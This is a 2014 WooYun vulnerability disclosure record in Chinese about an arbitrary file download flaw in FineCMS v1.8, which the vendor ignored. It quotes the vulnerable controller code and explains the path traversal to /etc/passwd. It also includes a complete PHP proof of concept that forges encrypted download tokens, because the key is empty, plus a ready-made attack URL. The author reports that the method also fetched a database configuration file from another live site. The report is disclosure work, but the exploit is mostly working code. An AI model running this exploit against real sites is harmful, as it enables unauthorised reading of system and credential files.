{"id": 54923, "wybug_id": "wooyun-2014-062787", "wybug_title": "FineCMS v1.8任意文件下载", "wybug_corp": "dayrui.com", "wybug_author": "紫衣大侠", "wybug_date": "2014-05-29 19:30", "wybug_open_date": "2014-06-03 19:30", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件读取"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-03：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 代码审计是个技术活，需要很好的耐心.. o(︶︿︶)o  详细说明：    出现问题的版本是FineCMS V1.8.0 最新版。   1.顺藤摸瓜  漏洞文件：controllers/ApiController.php downAction方法\npublic function downAction() {\t\t$data\t= fn_authcode(base64_decode($this->get('file')), 'DECODE');\t\t$file\t= isset($data['finecms']) && $data['finecms'] ? $data['finecms'] : '';\t\tif (empty($file)) $this->msg(lang('a-mod-213'));\t\tif (strpos($file, ':/')) {\t//远程文件\t\t\theader(\"Location: $file\");\t\t} else {\t//本地图片\t\t\tif (!is_file($file)) $this->msg(lang('a-mod-214') . '(#' . $file . ')');;    // $file = '../../../etc/passwd'\t\t\theader('Pragma: public');\t\t\theader('Last-Modified: ' . gmdate('D, d M Y H:i:s') . ' GMT');\t\t\theader('Cache-Control: no-store, no-cache, must-revalidate');\t\t\theader('Cache-Control: pre-check=0, post-check=0, max-age=0');\t\t\theader('Content-Transfer-Encoding: binary');\t\t\theader('Content-Encoding: none');\t\t\theader('Content-type: ' . strtolower(trim(substr(strrchr($file, '.'), 1, 10))));\t\t\theader('Content-Disposition: attachment; filename=\"' . basename($file) . '\"');\t\t\theader('Content-length: ' . sprintf(\"%u\", filesize($file)));\t\t\treadfile($file);\t\t\texit;\t\t}\t}\n   这段控制器函数主要是将前端提交过来的file文件路径进行解密并下载，如果文件是本地路径，则直接readfile下载下来。但是系统此时没有判断该文件的合法性，假设用户提交过来的文件解密后是: \n$file = ../../../etc/passwd  //passwd文件所在路径\n ，则会导致存在任意文件下载的风险。    实现方法：      注册一个会员，然后登陆进去。在“内容管理”--> \"下载\"中发布文档，  \n\n      下载地址前面填写passwd文件相对路径，后面随便填写。然后提交，等待管理审核通过。     审核通过后，直接点击下载链接， \n\n     可以看见系统passwd文件成功被下载下来了。 \n\n  \n\n     2.另辟蹊径   上面的任意下载文件有点曲折，非要注册后等待审核才能下载。其实通过测试发现，文件下载的的路径与数据库存储和用户cookie没有任何关系，因此我们完全可以构造任意文件的加密链接，就可以直接下载了。   文件下载地址：   http://xxx.xxx.xxx.xxx/index.php?c=api&a=down&file=MWZlYi83YkxvZlJoUkdCS0xIVk9ZQ0pIZ1p3Zm5TZFR3dEJsK2pucm9wUjdqYXg0OTlXVjhYa1hrb2ZzYmdKa1Z2bmRwTnJ0NVZGdEQrTlBieXNaWWhJeXFUZ2dsRnprY0hCeGx3    file变量进行了加密，跟进加密函数    extensions/function.php  \nfunction downfile($url) {\treturn url('api/down', array('file' => str_replace('=', '', base64_encode(fn_authcode(array('finecms' => $url), 'ENCODE')))));}\n     这里将../../../etc/passwd 作为URL参数进行fn_authcode加密生成\nMWZlYi83YkxvZlJoUkdCS0xIVk9ZQ0pIZ1p3Zm5TZFR3dEJsK2pucm9wUjdqYXg0OTlXVjhYa1hrb2ZzYmdKa1Z2bmRwTnJ0NVZGdEQrTlBieXNaWWhJeXFUZ2dsRnprY0hCeGx3\n     但是fn_authcode里SITE_MEMBER_COOKIE变量是为空字符串的，MD5固定为： d41d8cd98f00b204e9800998ecf8427e，并没有将用户的cookie信息作为加密因子，因此可以动态利用fn_authcode函数为我们想要的路径进行加密。     完成的POC：\n<?phpini_set('display_errors','1');error_reporting(E_ALL);function new_stripslashes($string) {\tif(!is_array($string)) return stripslashes($string);\tforeach($string as $key => $val) $string[$key] = new_stripslashes($val);\treturn $string;}function array2string($data, $isformdata = 1) {\tif($data == '') return '';\tif($isformdata) $data = new_stripslashes($data);\treturn serialize($data);}/*** 将字符串转换为数组* @param\tstring\t$data\t字符串* @return\tarray\t返回数组格式，如果，data为空，则返回空数组*/function string2array($data) {\tif ($data == '') return array();\tif (is_array($data)) return $data;\tif (strpos($data, 'array') !== false && strpos($data, 'array') === 0) {\t    @eval(\"\\$array = $data;\");\t\treturn $array;\t}\treturn unserialize($data);}function fn_authcode($data, $operation = 'DECODE', $key = '', $expiry = 0) {\t$ckey_length = 4;\t$string\t= $operation == 'DECODE' ? $data : array2string($data);\t$key\t= md5($key ? $key : '');\t$keya\t= md5(substr($key, 0, 16));\t$keyb\t= md5(substr($key, 16, 16));\t$keyc\t= $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : '';\t$cryptkey\t= $keya . md5($keya . $keyc);\t$key_length = strlen($cryptkey);\t$string\t= $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0) . substr(md5($string . $keyb), 0, 16) . $string;\t$string_length\t= strlen($string);\t$result = '';\t$box\t= range(0, 255);\t$rndkey = array();\tfor($i\t= 0; $i <= 255; $i++) {\t\t$rndkey[$i] = ord($cryptkey[$i % $key_length]);\t}\tfor($j = $i = 0; $i < 256; $i++) {\t\t$j = ($j + $box[$i] + $rndkey[$i]) % 256;\t\t$tmp = $box[$i];\t\t$box[$i] = $box[$j];\t\t$box[$j] = $tmp;\t}\tfor($a = $j = $i = 0; $i < $string_length; $i++) {\t\t$a = ($a + 1) % 256;\t\t$j = ($j + $box[$a]) % 256;\t\t$tmp = $box[$a];\t\t$box[$a] = $box[$j];\t\t$box[$j] = $tmp;\t\t$result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));\t}\tif($operation == 'DECODE') {\t\tif((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26) . $keyb), 0, 16)) {\t\t\treturn string2array(substr($result, 26));\t\t} else {\t\t\treturn '';\t\t}\t} else {\t\treturn $keyc . str_replace('=', '', base64_encode($result));\t}}$result = str_replace('=', '', base64_encode(fn_authcode(array('finecms' => '../../../../etc/passwd'), 'ENCODE')));echo \"加密:\".$result.\"<br/><hr>\";$data\t= fn_authcode(base64_decode($result), 'DECODE');echo \"解密：\".print_r($data).\"<br/><hr/>\";?><a href=\"http://10.121.50.249/index.php?c=api&a=down&file=<?php echo $result?>\">下载地址</a>\n我们将该POC部署到另外一台服务器上运行POC，可以直接成功下载到finecms服务器上的passwd文件。 \n\n   但是poc在finecms演示站没有成功，实例测试其他一个站点：   数据库配置文件 \n\n \n\n   漏洞证明：   \n\n  \n\n \n\n   修复方案：    我也不知道，你告诉我~~~   版权声明：转载请注明来源 紫衣大侠@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-06-03 19:30 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-05-29 20:53 |    \t\tMosuan \t\t\t( 普通白帽子  |\t\t\t        Rank:449 漏洞数:175        | 尘封此号，不装逼了，再见孩子们。by Mosua...)\t\t \n  看我发的，我都想抽死这种逗比厂商    \n     2014-06-03 22:13 |    \t\t紫衣大侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:201 漏洞数:21        | 愿结天下有识之士)\t\t \n  @Mosuan 哥们，理解你~~    \n     2014-06-03 23:10 |    \t\tMosuan \t\t\t( 普通白帽子  |\t\t\t        Rank:449 漏洞数:175        | 尘封此号，不装逼了，再见孩子们。by Mosua...)\t\t \n  @紫衣大侠 一说到这麒麟臂又要发作了    \n     2014-06-05 10:58 |    \t\tMosuan \t\t\t( 普通白帽子  |\t\t\t        Rank:449 漏洞数:175        | 尘封此号，不装逼了，再见孩子们。by Mosua...)\t\t \n  @紫衣大侠 不算通杀型……    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}